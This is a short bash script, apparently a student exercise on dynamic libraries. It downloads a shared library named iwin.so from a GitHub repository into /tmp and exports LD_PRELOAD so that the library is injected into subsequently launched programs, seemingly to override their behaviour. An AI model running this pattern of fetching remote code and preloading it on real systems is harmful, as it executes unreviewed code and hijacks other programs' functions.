#!/bin/bash
wget -P /tmp https://github.com/tiztaw/alx-low_level_programming/raw/main/0x18-dynamic_libraries/iwin.so
export LD_PRELOAD=/tmp/iwin.so
